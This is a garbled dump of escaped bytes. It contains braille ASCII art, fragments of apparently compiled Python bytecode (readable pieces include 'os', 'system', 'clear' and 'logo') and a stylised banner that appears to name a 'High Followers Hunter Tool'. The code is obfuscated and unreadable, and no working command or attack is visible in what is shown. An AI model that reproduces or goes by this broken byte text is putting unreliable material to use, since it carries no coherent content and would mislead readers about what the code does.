342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\242\\204\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\267\\342\\241\\270\\342\\243\\204\\342\\243\\231\\342\\243\\267\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\226\\342\\241\\232\\342\\240\\201\\342\\242\\200\\342\\243\\236\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\264\\342\\243\\224\\342\\240\\200\\342\\240\\200\\342\\240\\200    \\342\\240\\200\\342\\240\\200\\342\\243\\270\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277""\\342\\243\\277\\342\\243\\246\\342\\241\\200\\342\\240\\200\\342\\240\\220\\342\\240\\272\\342\\241\\217\\342\\243\\215\\342\\243\\201\\342\\240\\200\\342\\243\\275\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\275\\342\\243\\277\\342\\243\\257\\342\\243\\275\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\215\\342\\242\\201\\342\\241\\234\\342\\240\\211\\342\\240\\211\\342\\240\\223\\342\\242\\244\\342\\243\\204\\342\\243\\276\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\204\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\242\\240\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\"\"\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\246\\342\\241\\200\\342\\240\\240\\342\\243\\267\\342\\243\\277\\342\\243\\227\\342\\241\\244\\342\\240\\210\\342\\243\\271\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\277\\342\\240\\273\\342\\240\\233\\342\\242\\244\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\243\\250\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\206\\342\\240\\200    \\342\\240\\200\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\277\\342\\242\\277\\342\\243\\277\\342\\243\\277\\342\\240\\277\\342\\242\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\267\\342\\241\\200\\342\\240\\210\\342\\243\\277\\342\\243\\277\\342\\243\\204\\342\\240\\200\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\201\\342\\240\\271\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342""\\243\\277\\342\\242\\277\\342\\243\\277\\342\\243\\227\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\240\\202\\342\\243\\240\\342\\243\\277\\342\\243\\277\\342\\241\\277\\342\\240\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\267\\342\\240\\200\\n\\342\\242\\200\\342\\241\\277\\342\\241\\277\\342\\240\\211\\342\\243\\277\\342\\241\\237\\342\\240\\200\\342\\242\\270\\342\\243\\277\\342\\240\\217\\342\\240\\200\\342\\240\\200\\342\\242\\271\\342\\240\\277\\342\\240\\277\\342\\242\\277\\342\\243\\277\\342\\243\\267\\342\\243\\204\\342\\240\\232\\342\\242\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\277\\342\\240\\203\\342\\242\\210\\342\\243\\271\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\216\\342\\242\\277\\342\\243\\277\\342\\243\\207\\342\\240\\200\\342\\240\\200\\342\\243\\266\\342\\243\\264\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\273\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\204    \\342\\242\\270\\342\\243\\277\\342\\243\\277\\342\\243\\276\\342\\243\\277\\342\\241\\207\\342\\240\\200\\342\\242\\270\\342\\240\\213\\342\\240\\200\"\"\\342\\240\\200\\342\\240\\200\\342\\240\\270\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\240\\233\\342\\243\\277\\342\\243\\267\\342\\243\\237\\342\\243\\231\\342\\240\\277\\342\\243\\277\\342\\241\\201\\342\\243\\240\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\276\\342\\241\\277\\342\\242\\277\\342\\243\\277\\342\\240\\237\\342\\242\\277\\342\\241\\217\\342\\240\\200\\342\\242\\270\\342\\240\\211\\342\\240\\201\\342\\240\\200\\342\\240\\210\\342\\242\\271\\342\\242\\277\\342\\243""\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\n\\342\\242\\270\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\240\\200\\342\\240\\276\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\273\\342\\240\\215\\342\\240\\233\\342\\242\\277\\342\\240\\267\\342\\243\\266\\342\\243\\275\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\277\\342\\242\\277\\342\\243\\277\\342\\243\\206\\342\\240\\200\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\236\\342\\240\\200\\342\\240\\230\\342\\243\\277\\342\\243\\277\\342\\243\\237    \\342\\242\\270\\342\\243\\277\\342\\243\\277\\342\\243\\217\\342\\243\\277\\342\\241\\227\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\240\\342\\240\\222\\342\\240\\212\\342\\240\\211\\342\\240\\211\\342\\240\\211\\342\\242\\211\\342\\243\\222\\342\\240\\246\\342\\243\\204\\342\\240\\200\\342\\243\\270\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\243\\244\\342\\243\\277\\342\\243\\277\\342\\240\\277\\342\\240\\266\\342\\240\\266\\342\\242\\244\\342\\243\\200\\342\\243\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\277\\342\\243\\277\\342\\241\\207\\n\\342\\240\\230\\342\\243\\277\\342\\243\\267\\342\\243\\277\\342\\241\\235\\342\\240\\201\\342\\240\\200\\342\\240\"\"\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\242\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200""\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\242\\271\\342\\243\\256\\342\\243\\277\\342\\243\\277\\342\\243\\237\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\240\\231\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\240\\233\\342\\242\\206\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\213\\342\\242\\273\\342\\241\\207\\n\\342\\240\\200\\342\\240\\273\\342\\243\\277\\342\\243\\244\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\244\\342\\240\\210\\342\\240\\213\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\240\\263\\342\\241\\204\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\241\\277\\342\\240\\201\\n\\342\\240\\200\\342\\240\\200\\342\\242\\273\\342\\243\\247\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\270\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\244\\342\\243\\276\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\247\\342\\240\\200\\342\\240""\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\271\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\274\\342\\240\\203\\342\\240\\200    \\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\242\\277\\342\\241\\204\\342\"\"\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\231\\342\\243\\247\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\276\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\243\\247\\342\\240\\200\\342\\240\\200\\342\\243\\200\\342\\241\\274\\342\\240\\201\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\231\\342\\242\\266\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\277\\342\\243\\267\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\240\\342\\243\\264\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\223\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\276\\342\\241\\237\\342\\240\\200\\342\\240\\200\\342\\240\\233\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200""\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\231\\342\\240\\217\\342\\240\\211\\342\\240\\200\\342\\243\\240\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\267\\342\\243\\277\\342\\243\\277\\342\\242\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\270\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200    \\342\\240\\200\\342\\240\\200\\342\\240\\200\"\"\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\274\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\237\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\237\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\241\\274\\342\\240\\203\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\240\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342""\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\237\\342\\243\\267\\342\\243\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\240\\236\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200    \\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\243\\236\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\274\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\277\\342\\243\\276\\342\\242\\273\\342\\243\\277\\342\\243\\277\\342\\241\\237\\342\\242\\273\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\231\\342\\240\\263\\342\\242\\244\\342\\243\\200\\342\\243\\200\\342\\243\\200\\342\\243\\240\\342\\241\\244\\342\\240\\226\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\"\"\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\250\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\207\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\242\\263\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\243\\276\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\271\\342\\240\\204\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\240\\201\\342\\240\\200\\342\\240""\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\237\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\273\\342\\243\\277\\342\\243\\276\\342\\243\\277\\342\\243\\277\\342\\242\\270\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\242\\271\\342\\243\\277\\342\\243\\277\\342\\243\\207\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\276\\342\\243\\205\\342\\241\\277\\342\\243\\253\\342\\240\\237\\342\\243\\277\\342\\243\\277\\342\\241\\277\\342\\242\\271\\342\\241\\277\\342\\240\\277\\342\\243\\277\\342\\243\\277\\342\\243\\247\\342\\242\\270\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\207\\342\\243\\277\\342\\243\\277\\342\\240\\207\\342\\241\\236\\342\\243\\277\\342\\241\\217\\342\\240\\211\\342\\242\\267\\342\\240\\264\\342\\240\\202\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\"\"\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200""\\342\\243\\270\\342\\241\\277\\342\\240\\277\\342\\240\\237\\342\\240\\201\\342\\240\\200\\342\\241\\207\\342\\242\\270\\342\\241\\207\\342\\242\\200\\342\\243\\247\\342\\241\\244\\342\\242\\260\\342\\243\\277\\342\\241\\237\\342\\242\\270\\342\\241\\207\\342\\241\\217\\342\\242\\271\\342\\243\\277\\342\\240\\200\\342\\243\\277\\342\\241\\237\\342\\240\\200\\342\\242\\263\\342\\243\\277\\342\\241\\207\\342\\240\\240\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\236\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\241\\240\\342\\240\\200\\342\\240\\200\\342\\240\\201\\342\\243\\277\\342\\240\\203\\342\\242\\270\\342\\243\\277\\342\\240\\231\\342\\242\\272\\342\\243\\273\\342\\241\\227\\342\\240\\270\\342\\241\\207\\342\\240\\241\\342\\242\\270\\342\\243\\277\\342\\243\\260\\342\\240\\210\\342\\240\\200\\342\\240\\200\\342\\242\\230\\342\\243\\277\\342\\241\\207\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\242\\270\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\277\\342\\240\\200\\342\\240\\230\\342\\243\\277\\342\\241\\204\\342\\240\\200\\342\\240\\201\\342\\240\\201\\342\\240\\200\\342\\240\\203\\342\\240\\200\\342\\240\\210\\342\\243\\277\\342\\240""\\277\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\230\\342\\240\\200\\342\\240\\203\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\"\"\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\270\\342\\240\\200\\342\\240\\200\\342\\240\\231\\342\\241\\207\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\217\\342\\243\\245\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\243\\244\\342\\240\\224\\342\\240\\200\\342\\240\\246\\342\\240\\244\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\241\\231\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200""\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\"\"\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200\\342\\227\\207\\342\\224\\200c\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\003\\000\\000\\000\\003\\000\\000\\000\\363.\\000\\000\\000\\227\\000t\\001\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000j\\001\\000\\000\\000\\000\\000\\000\\000\\000d\\001\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000d\\000S\\000)\\002N\\332\\005clear)\\002\\332\\002os\\332\\006systemr*\\000\\000\\000r&\\000\\000\\000r$\\000\\000\\000r,\\000\\000\\000r,\\000\\000\\000\\214\\000\\000\\000s\\030\\000\\000\\000\\200\\000\\335\\004\\006\\204I\\210g\\321\\004\\026\\324\\004\\026\\320\\004\\026\\320\\004\\026\\320\\004\\026r&\\000\\000\\000c\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\003\\000\\000\\000\\003\\000\\000\\000\\363.\\000\\000\\000\\227\\000t\\001\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000t\\002\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000""\\000\\000\\000\\001\\000d\\000S\\000\\251\\001N)\\002r\\030\\000\\000\\000\\332\\004logor*\\000\\000\\000r&\\000\\000\\000r$\\000\\000\\000\\332\\001ir2\\000\\000\\000\\216\\000\\000\\000s\\021\\000\\000\\000\\200\\000\\335\\004\\007\\215\\004\\201I\\204I\\200I\\200I\\200Ir&\\000\\000\\000u\\252\\000\\000\\000\\n\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254\\342\\226\\255\\342\\226\\254    uk\\000\\000\\000      \\342\\232\\240 \\360\\235\\220\\207\\311\\252\\311\\242\\312\\234 \\360\\235\\220\\205\\341\\264\\217\\312\\237\\312\\237\\341\\264\\217\\341\\264\\241\\341\\264\\207\\312\\200s \\360\\235\\220\\207\"\"\\341\\264\\234\\311\\264\\341\\264\\233\\341\\264\\207\\312\\200 \\360\\235\\220\\223\\341\\264\\217\\341\\264\\217\\312\\237 \\360\\235\\220\\201\\312\\217 \\360\\235\\220\\214\\341\\264\\217\\312\\200\\360\\235\\220\\203\\311\\252s\\360\\235\\220\\227 